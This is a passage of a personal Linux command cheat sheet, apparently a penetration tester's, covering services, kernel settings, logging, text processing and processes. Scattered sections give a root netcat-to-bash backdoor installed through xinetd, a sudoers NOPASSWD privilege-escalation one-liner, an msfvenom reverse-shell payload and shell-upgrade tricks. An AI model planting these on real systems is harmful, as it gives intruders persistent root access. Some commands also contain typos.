			3. Enable service (to run [Install] sequence)
				$ systemtl enable yeet.service 
			4. Start service
				$ systemctl start yeet.service 
			
		}}} #
		{{{ #How to Make a SysD job
			$ chmod +x rc.local 
			- Add line in rc.local 
		}}} #
				
	}}} #	
	{{{ #System V 
		{{{ #How to Make/Delete a service
			1. 	{{{ #Make service script (yeet.sh)
					```O
					#!/bin/bash
					### BEGIN INIT INFO 
					# Provides:				yeet
					# Required-Start:
					# Required-Stop:
					# Default-Start:		2
					# Default-Stop:	
					# Short-Description:	asdf
					# Description:			asdf
					### END INIT INFO 
					
					case "$1" in
						start)
							echo -n "Starting Yeet Service"
							/usr/bin/yeet
							;;
						stop)
							echo -n Stopping Yeet Service"
							kill `cat /var/run/yeet.pid`
							;;
						*)
							echo "Usage: start|stop
							exit 1
							;;
					esac
					```C
					
				}}} #
			2. Make Service script executable 
				$chmod +x yeet.sh
			2. Move yeet.sh into init 
				$ mv /tmp/yeet.sh /etc/init.d/yeet.sh #(Now is a servce that can be accessed via $ service yeet.sh start)
			3. Enable Service  
				$ update-rc.d yeet.sh 
				- or -
				$ ln -s /etc/init.d/yeet.sh /etc/rc5.d/S08yeet 
		   
		}}} #
		{{{ #How to Make/Delete a job
			$ vim /etc/inittab # yee:234:command:/etc/init.d/yeet.sh 
			- https://www.ibm.com/docs/en/zos/2.2.0?topic=etcinittab-format-file
		
		}}} #	
	}}} #
	{{{ #Upstart
		{{{ #How to Make/Delete an Upstart SysV service
			- Copy the skeleton for format 
				$ cp /etc/init.d/skeleton /etc/init.d/yeet_hostname
			- Edit the do_start() function to do what you want
				- all other lines in the function can be commented out
				- comment out all of do_stop() and do_reload()
			$ chmod 755 /etc/init.d/yeet_hostname 
			- Verify service exists 
				$ service --status-all
			- Start service 
				$ service yeet_hostname start 
			- update runlevel configs 
				$ update-rc.d yeet_hostname start 88 2 3 4 5 
				$ update-rc.d yeet_hostname start 88 2 3 4 5 . stop 0 1 6 #If you have the stop function configured 
				
			- remove service
				$ rm /etc/init.d/yeet_hostname 
				$ update-rc.d yeet_hostname remove 

		}}} #
		{{{ #How to Make/Delete an Upstart service
			- https://zohaib.me/how-to-reliably-start-a-service-with-upstart/
			1. {{{ #Make Service Script (/etc/init/yeet.conf)
				```O
				start on runlevel [2345]
				
				script
					exec /opt/yeet-cannon.sh
				end script
				
				# Respawn and stop respawning if it got respawned 10 times in 10 seconds 
				respawn limit 10 10 
				
				```C
			}}} #
			2. Verify script syntax
				$ init-checkconf /etc/init/yeet.conf 
			3. Reload init configs 
				$ initctl reload-configuration
			4. Verify service exists 
				$ initctl list | grep yeet 
			5. Start service
				$ initctl start yeet 
				
			1. Remove Service 
				$ initctl stop yeet
				$ rm /etc/init/yeet.ssh.conf 
				$ initctl reload-configuration
				$ initctl list
		
		}}} #
		{{{ #How to Make a job
			1. {{{ #Make service script (yeet.conf)
				```O
				description		"Yeet Service"
				author			"CoolHandSquid Penetrations"
				
				start on runlevel [235] or starting gdm or startup 
				stop on runlevel [06]
				
				task 
				exec hostname -b -F /opt/betterhostname	
				```C
				}}} #
			2. .conf file will be read at next runlevel change 
		
		}}} #	
	}}} #

}}} #
{{{ #Services 
	{{{ #inetd-xinetd
		- Get Serivces with xinetd Enabled 
			$ chkconfig --list
		- Get Currently Enabled and Running inetd controlled services 
			$ inetadm | grep enabled
		{{{ #Persistant Backdoor
			$ vim /etc/init.d/yeet
				```O
				#!/bin/bash
				rm -f /tmp/testfifo
				mkfifo /tmp/testfifo
				cat /tmp/testfifo | /usr/bin/nc -l 32321 | bash > /tmp/testfifo
				```C
			$ chmod +x /etc/init.d/yeet 
			$ vim /etc/services 
				$ yeet 32320/tcp 
			$ vim /etc/xinetd.d/yeet 
				```O
				service yeet
				{
					flags -= IDONLY
					socket_type = stream
					wait = yes 
					user = root 
					server = /etc/init.d/yeet
					disable = no
				}
				```C
			$ chkconfig xinetd on 
			$ service xinetd restart 
			- Now Connect from another box
				- trigger inetd to start yeet service
					$ nc -v linux.ops.local 32320
				- connect to the now running service 
					$ nc -v linux.ops.local 32321
						
			- NOTE:
				- You may be able to add a line to /etc/inetd.conf instead of creating a file. Needs Verified
					$ vi /etc/inetd.conf
						web     stream  tcp     wait    root    /usr/bin/web            web
		}}} #
		{{{ #Solaris
			- Get inetd-Controlled services 
				$ inetadm 
			- Get inet service info 
				$ inetadm -l svc:/network/web/tcp:default
			- Enable inet services with SMF 
				$ inetconv -e
			- Notes 
				- inetadm	- observe or configure inetd-controlled services
				- inetconv 	- convert inetd.conf entries into smf service manifests, import them into smf repository 
		
		}}} #
	}}} #

}}} #

}}} ###	
{{{ ###Kernel
{{{ #Edit Kernel Boot Config 
	- Edit /etc/sysctl.conf
	
}}} #
{{{ #Edit Kernel Running Config
	- Edit Settings in /proc
	- Get current Value
		$ sysctl net.ipv4.ip_forward
		$ cat /proc/sys/net/ipv4/ip_forward (1 = enabled)
	- Disable IP Packet Forwarding
		$ sysctl -w net.ipv4.ip_forward = 0
	- Enable IPv4 routing
		$ sysctl -w net.ipv4.conf.all.forwarding=1
	- Enable Source Route Verification 
		$ sysctl -w net.ipv4.conf.default.rp_filter = 1
	- Disable Source Routing
		$ sysctl -w net.ipv4.conf.default.accept_source_route = 0
	- Disable the System Request debugging functionality of the kernel
		$ sysctl -w kernel.sysrq = 0
	- Enable whether core dumps will append the PID to the core filename (cool for debugging multi-thread applicaitons)
		$ sysctl -w kernel.core_uses_pid = 1
	- Enable the use of TCP syncookies
		$ sysctl -w net.ipv4.tcp_syncookies = 1
	- Disable netfilter on bridges
		$ sysctl -w net.bridge-nf-call-ip6tables = 0
		$ sysctl -w net.bridge-nf-call-iptables = 0
		$ sysctl -w net.bridge-nf-call-arptables = 0
	- Control maximum size of a message queue
		$ sysctl -w kernel.msgmnb = 65535
	- Control the maximum shared segment size in bytes
		$ sysctl -w kernel.shmmax = 68719476736
	- Control the maximum number of shared memory segments, in pages
		$ sysctl -w kernel.shmall = 4294967296
			
}}} #
{{{ #Kernel Interaction			
	- Get all kernel paramaters set in the running config
		$ sysctl -a 
	- Get value of a single module 
		$ sysctl vm.swappiness
		$ sysctl -n vm.swappiness
	- Get Module Details and Description
		$ modinfo dm_zero
	- Get Loaded Modules
		$ lsmod 	#Fields=Modules,Fields,Used-By
	- Get all available Kernel Modules
		$ modprobe -l 
	- Set Module value 
		$ sysctl -w wm.swappiness=1
	- Load Module 
		$ insmod /tmp/wl.ko
		$ modload	?
		$ modprobe 	?
	- Unload Module	(Must be loaded and not being used by another module)
		$ modprobe -r wl.ko 
		$ rmmod wl.ko		#There is a force option (-f)
		
	{{{ #Good To Know Commands
	> dmesg: (Display message or driver message) show Kernel ring buffers
	> insmod: (Insert Module) Insert Module to kernel 
	> lsmod: (List Loaded Modules) List which loadable kernel modules are currently loaded
	> make: utility for building and maintaining groups of programs
		- Uses makefiles
	> modinfo: (Module Info) display's information about a Linux Kernel module
	> modprobe: (Module Probe) Loads and unloads kernel modules
		- Udev relies upon modprobe to load drivers for automatically detected hardware
	> pmap: (Process Map) reports the memory map of a process or processes
	> strace: (System Trace) monitor and tamper with interactions between processes and the Linux kernel
		- made possible by the kernel feature known as ptrace
	> sysctl: (system Control) reads and modifies the attributes of the system kernel
		- Attributes like:
			- version number
			- maximum limits
			- security settings
	> truss: makes it possible to print out the system calls made by and the signals received by this executable command-line argument.
	> uname: (Unix Name) Prints name, version, and details about the machine and OS.
	
	}}} #

}}} #
{{{ #System Calls
> System Calls: fundamental interface between an application and the Linux kernel.

## File Operations
	> open(): allocates resources associated to the file, and returns a handle that the process will use to refer to that file
	> read(): attempts to read up to *x* bytes from file descriptor into the buffer starting at buf (Returned value in strace is number of bytes read)
	> write(): writes up to *x* bytes from the buffer
	> close(): Closes a file descriptor (So it may be reused)

## Process Manipulation
	> fork():
	> execve(): Executes Program by pathname
		- pathname must be either a binary executable, or a script (#!)
	> kill():
	
## Memory Operations
	> mmap(): (memory map) requests a segment of memory for the process to use.
	> calloc(): allocates the memory and also initializes the allocated memory block to zero
	> malloc(): allocates memory block of given size (in bytes) and returns a pointer to the beginning of the block
		- malloc() doesn’t initialize the allocated memory
	> free(): allows you to release or deallocate the memory blocks which are previously allocated by calloc()
	> munmap():
	> mprotect():
		
## Data movement
	> socket(): creates an endpoint for communication and returns a file descriptor that refers to that endpoint.
	> send(): used to transmit a message to another socket
		- Similar
			> sendto():
			> sendmsg():
	> recv(): used to receive messages from a socket
		- Similar
			> recvfrom():
			> recvmsg():

## Other
	> chmod(): (Change Mode) Changes file mode bits (permissions) via pathname
		> fchmod(): chmod() via file descriptor 
	> chown(): (Change Owner) Changes the ownership of the file via Pathname
		> fchown(): chown() via file descriptor
		> lchown(): chown() and does not dereference symbolic links
	> access(): Checks if process has permission to access a file.
	> fstat(): (File status) looks for file info such as rights, owner, size. (done via FD)
}}} #
{{{ #System Calls Tools
	- Solaris 
		- Basic Syntax
			$ truss -o output.txt echo "Yeet for the cannon"	
	- Nix
		- Basic Syntax
			$ strace -o output.txt echo "Yeet for the cannon"

}}} #

}}} ###	
{{{ ###Logging		
{{{ #Greps/Applications
	- Get /var/log by timeframe 
		$ find /var/log -type f -newermt "2017-12-20 08:52:55" \! -newermt "2017-12-20 09:52:55" 2>/dev/null
	> IPTables: 
		- Syslog 
			- LOG=kern.warning
			- :msg, contans, "LOG prefix string here"
		- Auditd 	= No 
		- Journald 	= Maybe?
		- Genreal	= $ grep -rin "IN=.*OUT=.*" /var/log
	> firewalld: 
		- Jornald
	> sudo:		
		- General	= sudoers file "logfile=" or /var/log/mail/root
		- rsyslog	= yes authpriv,local2
		- autidtd	= yes 
	> SeLinux:
		- Auditd by default 
		- If auditd is not running, it will go to syslog (probably kern facility?)
		- grep for "AVC" or "denied"
	> Yum:
		- Installed Packages:	$ grep "Aug 19" /var/log/yum.log | grep Installed | wc -l
		- Removed Packages:		$ grep "yum: Erased:" /var/log/messages
	> Solaris Reboots: $ grep "SunOS Release 5.10" /var/adm/messages | grep Oct | wc -l
	> crond: 	Facility=Cron 	Level=Info 
	> ssh:
		$ vim /etc/ssh/sshd_config # Look for "SyslogFacility AUTHPRIV"

}}} #
{{{ #How They Work Together
	> Auditd:
		- What it logs by default (Allegedly): $ sudo aureport -x --summary
			- SeLinux 
			- System Calls
			- Auditd starting and stopping 
			- https://serverfault.com/questions/774862/what-does-auditd-log-by-default-i-e-when-no-rules-are-defined
			- https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types
				- /usr/sbin/crond
				- /usr/libexec/dovecot/auth
				- /usr/sbin/sshd
				- /usr/bin/sudo
				- /usr/sbin/xtables-multi
				- /usr/lib/systemd/systemd
				- /usr/bin/passwd
		- Can be ported into syslog with audisp (Plugin)
	> Syslog: 
		- What it logs:
			- Auditd if audisp is forwarding 
				- Audisp plugin sends auditd logs to syslog user facility 
			- Everything sent to /dev/log (See References)
	> journald:
		- What it logs:
			- Auditd by default
			- Dmesg	#Forwarded from /dev/kmsg
			- Everything sent to /dev/log 
				- Takes presidence over syslog
					- Debian: Syslog will listen over /run/systemd/journal/syslog 
					- CentOS: Directly to syslog via Journal API (journalctl) reading from journald (/run/log/journald)
					- lsof syslog for situational clarification
	> Application Logs:
		- See References

}}} #
{{{ #Tools 
	{{{ #apparmour
		- Get aa status 
			$ aa-enabled 
		- Get aa profiles 
			$ aa-status 
		- Set aa profile (complain, enforce, ...)
			$ aa-complain /usr/bin/ping 
			$ apparmor_parser				#reads apparmor config into memory without restarting service
		- Enable/Disable aa 
			$ vim /etc/default/grub 
				$ GRUB_CMDLINE_LINUX_DEFAULT="apparmor=0"		#0:Disable, 1:Enable 
			$ update-grub 
			$ init 6
	
	}}} #
	{{{ #auditd
		- Get current ruleset 
			$ auditctl -l 
		- Search Logs by binary 
			$ ausearch -x "/usr/bin/passwd"
		- What is auditlog logging?
			$ aureport -x --summary 
			$ rpm -q --whatrequires audit-libs
		- Search by Time 
			$ ausearch --start 01/22/2022 "05:00:00" --end 01/24/2022 "09:38:00"
		
	}}} #
	{{{ #journal (journalctl)
		- Arguments 
			- --priority emerg				= Select by Priority
			- --since YYYY-MM-DD HH.MM.SS	= Select by Time (If YMD is gone, it assumes today. If HMS is gone, it assumes 00.00.00)
			- --until ^
				- today, tomorrow, yesterday, now, -, +
			- --unit 			= Based on Service unit 
		- Get journalctl logging location 	
			$ journalctl --header 
		- Get service entries for a unit file  
			$ journalctl -u crond 
		- Get service entries from last 2 hours 
			$ journalctl -u crond --since -2h	#--since="2018-01-01 12:01:00"
		- Get entries with severity crit or higher 
			$ journalctl -p crit 
			$ journalctl -p 2..0
		- Get Logs from a particular boot 
			$ journalctl --list-boots 
			$ journalctl -b -6
		- Get Logs by time 
			$ journalctl --since "2012-10-30 18:17:16" --until "2022-10-30 18:05:00"
		- check for persistant logging
			$ lsof -p "journald"

	}}} #
	{{{ #last			#Many inidvidual login tools (sshd,ttymon)
		- Get successful login attempts
			$ last
		- Get unsuccessful login attempts
			$ lastb
		- Read specific wtmp file 
			$ last -f /var/log/wtmp.1
		- Get user that logged in since last boot 
			$ last -f /var/{log,adm}/utmpx
		- Get runlevel change time 
			$ last -Fiwx
		
		- NOTES:
			- last searches /var/log/wtmp
			- lastb searches /var/log/btmp
			- Stored in "Hrs:Mins" format

	}}} #	
	{{{ #logger 
		- Create test message (Solaris)
			$ logger -p auth.notice tst msg
	
	
	}}} #
	
}}} #	

}}} ###
{{{ ###Other
	{{{ #CPU Usage 
		- dmidecode   
		- free
		- top	
	
	}}} #
	{{{ #File Recovery
		- https://www.youtube.com/watch?v=SRmvRGUuuno&t=633s	#10 minute mark
		- See all drives/devices
			$ lsblk
		- Move into drive/device that file has been lost 
			$ cd 
		- See where data is stored 
			$ mount
			```O
			root@raspberrypi:/media/usbstick# mount
			/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
			```C
		- View Strings
			$ strings 
			```O
			root@raspberrypi:/media/usbstick# strings /dev/sdb
			3d3e483143ff12ec505d026fa13e020b
			Damnit! Sorry man I accidentally deleted your files off the USB stick.
			```C
		- View pure hex 
			$ xxd /dev/sdb
		- Steal flag	
			$ grep -a ‘[a-z0-9]\{32\}’ /dev/sdb    #will grep the hex values for lowercase letter or number, 32 in a row.

	}}} #
	{{{ #GRUB
		- reinstall grub to /dev/sda 
			$ grub-install /dev/sda

	}}} #
	{{{ #hash
		- Hash all files in dir and subdir
			$ find . -type f -print0 | xargs -0 md5sum
	
	}}} #
	{{{ #Help
	# man
		- general syntax
			$ man ls
	# apropos 
		- find commands for file compression
			$ apropos compress

	}}} #
	{{{ #Privesc With One root Command
	$ echo "username  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/username && sudo bash
}}} #
		
{{{ ###Shell Fixes
{{{ #Alternative Shell fix 
	$ msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=3233 R
		- From here I'd recomend going through the original fixes again (python -c 'import pty;pty.spawn("/bin/bash");'    and so on)
                       
}}} # 
{{{ #Debug Fix     
	- https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/  					
	$ msfconsole
	$ use exploit/multi/script/web_delivery                    
 
}}} # 
{{{ #NC Shell Fix 
	- See available shells 
		$ cat /etc/shells
	- spawn shell with python (So you can delete and move cursor 
		$ python -c 'import pty;pty.spawn("/bin/bash");'
		$ python3 -c 'import pty;pty.spawn("/bin/bash");'
		$ python -c 'import pty;pty.spawn("/bin/sh");'
	- To Tab Complete
		$ control z
		$ stty raw -echo
		$ fg           		#you will be blind
	- To Clear Screen 
		$ export TERM=screen	

}}} #
{{{ #VI Fix
    $ stty -a #(in a kali terminal)	(annotate row and column numbers)
    $ stty rows 34 columns 137
    
}}} #

{{{ #Spawn a TTY by Language
	- Bash
		$ echo os.system('/bin/bash')
	- Lua
		$ os.execute('/bin/sh')
	- Perl 
		$ perl -e 'exec "/bin/sh";'
		$ perl: exec "/bin/sh";
	- Python
		$ python -c 'import pty; pty.spawn("/bin/sh")'
	- Ruby
		$ exec "/bin/sh"
	- Shell
		$ /bin/sh -i
		$ exec "/bin/sh"
		
	- vi 
		$ :!bash
		$ :set shell=/bin/bash:shell
	- nmap 
		$ !sh                       

}}} #

}}} ###	

}}} ###
{{{ ###Output Manipulation/File Processing
{{{ #awk
	- Do Not Print line 1
		$ awk 'NR!=1{print $0}'
	- If field one matches the regex string, do not print the line.
		$ awk '$1!~/^regex$/{print $0}'
	- If field 1 is more than 20 and field 4 is greater than 500000, print the whole line.
		$ awk '$1>20 && $4>=500000{print $0}'
	- if regex string matches, (root or color) in a line, do not print it.
		$ awk '!/root|color/{print $0}'
	- Replacement Example 
		$ awk 'BEGIN{print "Replace root with SuperUser"}{if ($3=="root") {$3="SuperUser"; print $0}else {$3="RegUser"; print $0;}}END{print "Thats all folks!"}'	

	- Print Number of Fields
		$ awk -F "/" '{print $NF}'
	- Use NR (Number Record (line numbers))
		$ nl DataFileComma.txt| awk -F "," 'NR>=2 && NR<5 || NR==32 || NR>47{print $1}'    
			 2  Howard Green
			 3  Anthony Wilkerson
			 4  Daniel Curtis
			32  Maria Armstrong
			48  David Garcia
			49  Travis Alexander
			50  Harold Cummings

	- Print lines that have an ID of more than 20 and a Salary of 500000 or more.
		$ awk -F "," '$1>20 && $4>=500000{print $0}' CustomerData.txt
			ID,Name,Email,Salary,Country
			23,Bernard Rojas,thomaskristina@gmail.com,577866,Turkmenistan
			25,Maria May,allenjennifer@yahoo.com,781429,Monaco
			26,Lynn Carr,scottbates@gmail.com,986395,New Caledonia
			27,Darlene Rice,brooksdaniel@yahoo.com,539581,Greece
			29,Keith Mccormick,smithvictoria@dalton.net,932631,Pitcairn Islands
			30,David Rodriguez,valeriemartinez@wright.com,787859,Ethiopia
			34,Anthony Adams,joshua65@espinoza-guzman.net,806982,Denmark
			35,Larry Callahan,greenjim@yahoo.com,612264,Fiji
			37,Samantha Li,briancooper@carlson.org,698179,Liberia
			38,Sierra Bradley,bmiller@hotmail.com,596400,Korea
			39,Cody Watts,elizabeth64@hammond-smith.biz,595939,Guyana
			41,Joyce Larson,valerieduarte@henderson.info,740254,Saint Vincent and the Grenadines
			42,Karl Lewis,alecharris@yahoo.com,962209,Micronesia
			44,Daniel Coleman,dmiller@hotmail.com,774884,Samoa
			45,Scott Hill,blakeerin@hotmail.com,605781,Cote d'Ivoire
			46,Anthony Oliver,james11@yahoo.com,781085,Vanuatu
			50,William Howard,wallaceeric@parks-abbott.com,835215,Belgium

	- Substring RegEx Match Include
		$ awk -F "," '/@hotmail|@gmail/{print $0}' CustomerData.txt |head -n 5
			4,Cindy Garcia,williamstara@hotmail.com,401828,Palestinian Territory
			5,Karen Hubbard,dustinboyer@hotmail.com,41390,Chile
			7,Richard Coleman,michelle17@hotmail.com,7064,Kenya
			10,Stephanie Carter,turneranthony@gmail.com,909352,Saint Martin
			12,Beverly Bennett,marisamills@hotmail.com,814826,Peru

	- Substring RegEx Match Disclude
		$ awk -F "," '!/@hotmail|@gmail/{print $0}' CustomerData.txt |head -n 5
			ID,Name,Email,Salary,Country
			1,Jennifer Nelson,jessica21@yahoo.com,294643,Reunion
			2,Matthew Wright,stephen02@yahoo.com,249704,Norfolk Island
			3,Jacqueline Stewart,snguyen@yahoo.com,255884,United States of America
			6,Anna Adams,brooke85@castillo.com,440814,Anguilla


	- Substring Per Field Match Include
		$ awk -F "," '$3~/@gmail|@hotmail/{print $0}' CustomerData.txt |head -n 5
			4,Cindy Garcia,williamstara@hotmail.com,401828,Palestinian Territory
			5,Karen Hubbard,dustinboyer@hotmail.com,41390,Chile
			7,Richard Coleman,michelle17@hotmail.com,7064,Kenya
			10,Stephanie Carter,turneranthony@gmail.com,909352,Saint Martin
			12,Beverly Bennett,marisamills@hotmail.com,814826,Peru

	- Substring Per Field Match Disclude
		$ awk -F "," '$3!~/@gmail|@hotmail/{print $0}' CustomerData.txt |head -n 5
			ID,Name,Email,Salary,Country
				1,Jennifer Nelson,jessica21@yahoo.com,294643,Reunion
				2,Matthew Wright,stephen02@yahoo.com,249704,Norfolk Island
				3,Jacqueline Stewart,snguyen@yahoo.com,255884,United States of America
				6,Anna Adams,brooke85@castillo.com,440814,Anguilla


	- Variable Replacment, If statment
		$ ps -elfH | awk -F " " 'BEGIN{print "Replace root with SuperUser"}NR!=1{if ($3=="root") {$3="SuperUser"; print $0}else {$3="BitchUser"; print $0;}}END{print "Thats all folks!"}' | grep Bitch
			4 S BitchUser 517 1 0 80 0 - 2228 - 07:24 ? 00:00:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
			4 S BitchUser 756 1 0 81 1 - 38423 - 07:24 ? 00:00:00 /usr/libexec/rtkit-daemon
			4 S BitchUser 1057 1 0 80 0 - 60731 - 07:24 ? 00:00:00 /usr/libexec/colord

	- While Loop
		$ awk -F "|" '{i=1;while(i<=3){print $0;i++;}}' file2.txt 
			id|name|salary
			id|name|salary
			id|name|salary
			1|Amit|10000
			1|Amit|10000
			1|Amit|10000
			2|Ajay|200000
			2|Ajay|200000
			2|Ajay|200000
			3|John|300000000
			3|John|300000000
			3|John|300000000

	- For Loop
		$ awk -F "|" '{for(i=1;i<=2;i++){print $0}}' file2.txt     
		id|name|salary
		id|name|salary
		1|Amit|10000
		1|Amit|10000
		2|Ajay|200000
		2|Ajay|200000
		3|John|300000000
		3|John|300000000

}}} #
{{{ #col
	- Make output more pretty/human readable
		$ man man | col -bx > man.col.txt

}}} #
{{{ #cut
	- show the 3rd to 59th charachters of each line
		$ c3-59
	- Delimeter=| and print fields one through three
		$ -d "|" -f1-3	
	- Delimeter=| and print all fields other than two
		$ -d "|" --complement -f2	

}}} #
{{{ #diff
	- Generic Syntax
		$ diff file1 file2 
	- Use input from pipe
		$ dd if=/dev/sda bs=512 count=1 | diff - /boot/grub/stage1

}}} #
{{{ #find
	- Examples 
		$ find /etc/ -type f -name '*.conf' | xargs egrep -l "ops.local" {} 2> /dev/null
	- xargs
		$ find . -type f | xargs -I {} cat {}
	- By Name
		$ find /opt -maxdepth 2 -mindepth2 -wholename './*/dir2'
		$ find / -regextype awk -regex ".*/\.\.+.*"		#With regex
	- By type (xtype filters where a symlink is pointing to)
		$ find /opt -type l -a -xtype f 			
	- Printing
		$ find /root -maxdepth 2 -type f -printf '%f\n'
	- Prune (Don't show these )
		$ find . -wholename './src/emacs' -prune -o -print 
	- Timestamp parse
		$ find .mozailla ! -newermt 'aug 26 2018 15:08' !=not newer modified time #Alternative $ -mtime -1 #last day
	- Get all char and block devices not in /dev 
		$ find / \! -wholename '/dev*' \( -type b -o -type c \)
	- Change file extension 
		$ find /var/www/html -type f -name '*.htm' -exec mv \{\} \{\}l \;
	- Get files with same inode 
		$ find / -samefile /yeet/cannon.txt 
		$ find / -inum 74653
	- Get files with sticky bit set 
		$ find / -perm -4000	#SUID
		$ find / -perm -2000	#SGID
	- Get who has a file opened
		$ find /var/log/* -exec fuser -uv \{\} \;
	- Get files with create time in range 
		$ touch /tmp/start /tmp/stop
		$ touch -t YYYYMMDDHHMM.SS /tmp/start
		$ touch -t YYYYMMDDHHMM.SS /tmp/stop
		$ find / -newer /tmp/start -not -newer /tmp/stop 2>/dev/null

## General Syntax
	$ find <paths> <options> <tests> <actions>
	- Paths:
		- Can be several
		- Will search recursivly
	- Operations:
		$ maxdepth 3
		$ mindepth 2
		$ -prune 	#Remove ceratin files 
	- Tests:
		$ -name \*.log
		$ -samefile filename	#Find files that point to the same inode
		$ -type f 	#See Find File Types 
		$ -wholename #will retun path and filename 
	- Actions:
		$ -print 	#Default
		$ -exec wc -l \{\} \;	#;=executed once per file 
		$ -exec wc -l \{\} \+	#+=executed once per list of files 
		
## Operators
	- AND implicit, -a, -and
	- OR	Explicit, -o, -or
	- NOT 	Explicit, !, -not
	- () precedence \(\) bash

## Find File Types
	- b block device (buffered) special   (hard drive, USB, CD, etc...)
	- c charachter device (unbuffered special)             (like block device but only 1 char is r/w at a time (like a tty))
	- d directory
	- p named pipe (FIFO)
	- f regular file
	- l symbolic link
	- socket
	
## ls -F type indicators
	-  regular file (nothing)
	- / directory
	- * executable files
	- | named pipe (FIFO)
	- = socket
	- >doors (Sun Only)	
	- @ symbolic link
	
}}} #
{{{ #grep
	- general syntax
		- grep options pattern file/folder/list_of_files
Code	| Description
---		| ---
.		| any char 
?		| match zero or 1 time
*		| match zero or more times
+		| match one or more times 
{N}		| match N times 
{N,}	| match N or more times 
{N,M}	| match at least N but no more than M times.	
	
## Arguments
	-r RECURSIVLY recursivly thorugh files
	-i INSENSITIVE case INsensitive
	-n NUMBERshow line numbers
	-l LISTonly return the filename of matches
	-v INVERSE does not contain match
	-c COUNT count matches

	-C 2 CONTEXT. Show two above and two below
	-B 1 BEFORE. Show one Line before match
	-A 1 AFTER. Show one line After match

	-e 'regex' -e 'anotherRegEx'	EXTENDED Have multiple regex patterns to match <probably better to use egrep "reg|other"

	-o .	ONE_CHAR_PER_LINE	print one char per line.
	
	- Get Files that are in File1 and not in File2
		$ grep -v -f file2 file1
}}} #
{{{ #nl
	- General usage 
		$ echo "your\nmom" | nl
			 1  your
			 2  mom

}}} #
{{{ #RegEx
## Notes"
	- [RegEx Flavor Comparer](https://remram44.github.io/regex-cheatsheet/regex.html)
	- ```
	- [ ] are for a charachter class (what the digit can be)
	- { } is for a multiplyer (how many times will the preceding charachter ( or charachter class be used )
	- ( ) Is for capture groups. These will be analyzed on their own and can be used for replacement with %s in vim and sed.
	- ^ Is to pin to the beggining of a line
	- $ is to pin to the end of the line.
	- \1 \2 \3 is to call a capture group
	- In vim you'll need to escape (){. You Also can not use +. Instead use \{1,}

}}} #
{{{ #sed
	- Notes:
		- replament chars can be /// or ###
	- don't print lines 3-5
		$ sed -n '3,5!p'
	- print lines that match regex
		$sed -n '/regex/p'
	- replace regex hits with new string, globally. WO globaly it will only replace first instance per line.
		$ sed -r 's/regex/newstring/g'
	- if line contains instance, apply substitution
		$ sed -r '/Instance/s/regex/newstring/'
	- If line matches regex, delete it.
		$ sed -r '/regex/d'
	- If line matches this, do this 
		$ sed -i -e '/b64/ s/^/#/' /etc/audit/audit.rules
		$ sed -i -e '/b32/ s/^#//' /etc/audit/audit.rules
	- insert the following string to line 3.
		$ sed '3i Cool String'

## Examples	
	- get ipv4 address of eth0
		$ ip a | sed -n "s/^\s*inet\s\([^\/]*\)\/.*eth0$/\1/p"

	- Replace ipv4 address
		$ ip a | sed -r "s/^\s*inet\s([^\/]*)\/.*eth0$/I MADE THIS LINE HAPPEN AND ADDED THE IP ADDRESS \1/g"

}}} #
{{{ #tail
	- remove the first line
		$ tail -n +2
		
}}} #
{{{ #tr
	- replace new line char with a space
		$ tr '\n' ' '
	- remove all new line chars	
		$ tr -d '\n'
	- ROT13
		$ tr 'A-Za-z' 'N-ZA-Mn-za-m'

}}} #
{{{ #xargs
	- General Usage
		$ find /home/squid -maxdepth 1 -mindepth 1 -print0 | xargs -0 cp -r -t /homes/squid		#- zero

## Notes:
	- be sure to use -print0 and xargs -0 basically always. this makes the splitter a null byte as opposed to a space... which could be in a filename.2

}}} #

}}} ###
{{{ ###Processes and Signals 
	{{{ #Common Signals
	Signal		| Description
	---			| ---
	SIGHUP		| Terminate Process (Hangup)
	SIGINT		| Terminate Process (Interrupt from keyboard (Ctrl c))
	SIGQUIT		| Terminate Process and create core dump (Ctrl \)
	SIGKILL		| Terminate Process (sent to kernel, process cannot stop)(cannot be masked or trapped)
	SIGTERM		| Terminate Process with cleanup time
	SIGCHLD		| Child status changed (Ignore signal is default)
	SIGSTOP		| Stop Process (CANNOT be caught or ignored)(cannot be masked or trapped)
	SIGSTP		| Stop Process (Can be caught or ignored)
	SIGCONT		| Continue process if it is currently stopped (otherwise ignore)(Cannot be masked)
	
	}}} #
	{{{ #System ID with processes 
		- Solaris 
			- init = /etc/init = Solairs 9
			- init = /sbin/init = Solaris 10 or later 
		- Linux Version via "flush" process 
			- < 2.6			= [bdflush]
			- 2.6.0-2.6.31	= [pdflush]
			- 2.6.32 >:		= [flush-#:#]
			
	}}} #		
	{{{ #Tools
		{{{ #kill 
			- Get signal options 
				$ kill -l 
			- Send signal 
				$ kill -s 9 <PID>

		}}} #
		{{{ #ps 
			- General Syntax 
				- Unix/Linux 
					$ ps -elfH 
					$ ps -eo user,pid,ppid,vsz,tty,comm,args
				- Solaris 
					$ ps -ef 
			- Process Masquerading Hunt
				$ ps -eo user,pid,ppid,vsz,tty,comm,cmd --sort start_time | awk '$4 != "0"'
			- Get Thread Count 
				$ ps -eLf 	#NLWP is the thread count 
			- Get Processes Started by a Process 
				$ ps -ejH
		
		}}} #
		{{{ #ptools (Solaris)
			> pargs: process arguments
			> preap: Clean Zombie processes
			> pcred: process credentials
			> pfiles: process open files 
			> pldd: process list dynamic libraries
			> prstat: process statistics
			> prun: set each process to running
			> pstop: stop each process
			> psig: List signal action of each process
			> ptime: time a command 
			> ptree: get process tree
			> pwdx: process working dir 

		}}} #

	}}} #
	
}}} ###
{{{ ###Shell	
{{{ #Conditional Expressions (+test)
	- For more conditionals: 
		$ man test 
Argument 		| Definition
---				| ---
el && e2 		| True if Both True
e1 || e2 		| True if Either True 
!= 				| True if Does not equal 
=~				| True if Matches extended Regular Expression
STR1 == STR2	| True if the strings are equal 
STR1 != STR2	| True if the strings are not equal
STR1 < STR2 	| True if STR1 sorts liexigraphically before STR2 (! and < need escaped)
STR1 > STR2 	|:True if STR1 sorts liexigraphically after STR2 (! and < need escaped)
-n STR 			| True if length of STR is not zero 
-z STR 			| True if length of STR is zero 
NUM1 -eq NUM2	| True if NUM1 and NUM2 are equal 
